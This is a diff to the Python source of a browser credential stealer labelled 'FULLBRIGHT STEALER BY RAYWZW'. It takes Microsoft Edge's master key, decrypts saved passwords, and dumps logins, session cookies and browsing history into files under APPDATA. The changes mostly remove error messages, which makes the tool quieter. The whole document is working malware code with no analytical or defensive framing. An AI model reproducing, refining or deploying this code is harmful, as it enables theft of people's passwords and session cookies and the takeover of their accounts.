@@ -24,7 +24,6 @@ def get_master_key():
     except (json.JSONDecodeError, IOError) as e:
         print(f"Error reading Local State file: {e}")
         return None
-
     if "os_crypt" not in local_state:
         print("No 'os_crypt' section found in Local State.")
         return None
@@ -46,7 +45,6 @@ def decrypt_password(buff, master_key):
         cipher = AES.new(master_key, AES.MODE_GCM, iv)
         return cipher.decrypt(payload)[:-16].decode()
     except Exception as e:
-        print(f"Failed to decrypt password: {e}")
         return ""
 
 def extract_data_from_db(db_path, query, process_row, temp_prefix):
@@ -63,24 +61,19 @@ def extract_data_from_db(db_path, query, process_row, temp_prefix):
         return result
     finally:
         os.remove(temp_path)
-
 def get_login_data(master_key):
     query = 'SELECT action_url, username_value, password_value FROM logins'
     def process_row(row):
         if row[0] and row[1] and row[2]:
             try:
                 password = decrypt_password(row[2], master_key)
-                return f"URL: {row[0]}\nEmail: {row[1]}\nPassword: {password}\n----------------------\n"
+                return f"URL: {row[0]}\nEmail/Username: {row[1]}\nPassword: {password}\n----------------------\n"
             except Exception as e:
-                print(f"Error decrypting password: {e}")
                 return ""
         return ""
-    
     header = "------------FULLBRIGHT STEALER BY RAYWZW------------\n"
     data = extract_data_from_db(os.path.join(edge_path, 'Login Data'), query, process_row, 'login_db')
     return header + data
-
-
 def get_cookies():
     query = 'SELECT name, value, host_key, path, expires_utc FROM cookies'
     def process_row(row):
@@ -89,9 +82,6 @@ def get_cookies():
             return f"{host}\tTRUE\t{row[3]}\tTRUE\t{row[4]}\t{row[0]}\t{row[1]}\n"
         return ""
     return extract_data_from_db(os.path.join(edge_path, 'Network', 'Cookies'), query, process_row, 'cookies_db')
-
-
-
 def get_history():
     query = 'SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time ASC'
     def process_row(row):
@@ -101,32 +91,24 @@ def get_history():
     header = "------------FULLBRIGHT STEALER BY RAYWZW------------\n"
     data = extract_data_from_db(os.path.join(edge_path, 'History'), query, process_row, 'history_db')
     return header + data
-
-
 def random_filename(prefix):
     return f"{prefix}_{''.join(random.choices(string.ascii_lowercase + string.digits, k=6))}"
-
 def save_results(logins, cookies, history):
     vault_dir = os.path.join(os.getenv('APPDATA'), 'vault', 'edge')
     if not os.path.exists(vault_dir):
         os.makedirs(vault_dir)
-    
     if logins:
         logins_filename = os.path.join(vault_dir, 'edgelogins.txt')
         with open(logins_filename, 'w', encoding="utf-8") as logins_file:
             logins_file.write(logins)
-        
     if cookies:
         cookies_filename = os.path.join(vault_dir, 'edgecookies.txt')
         with open(cookies_filename, 'w', encoding="utf-8") as cookies_file:
             cookies_file.write(cookies)
-        
     if history:
         history_filename = os.path.join(vault_dir, 'edgehistory.txt')
         with open(history_filename, 'w', encoding="utf-8") as history_file:
             history_file.write(history)
-
-
 def edgethief():
     kill_edge()
     time.sleep(2)
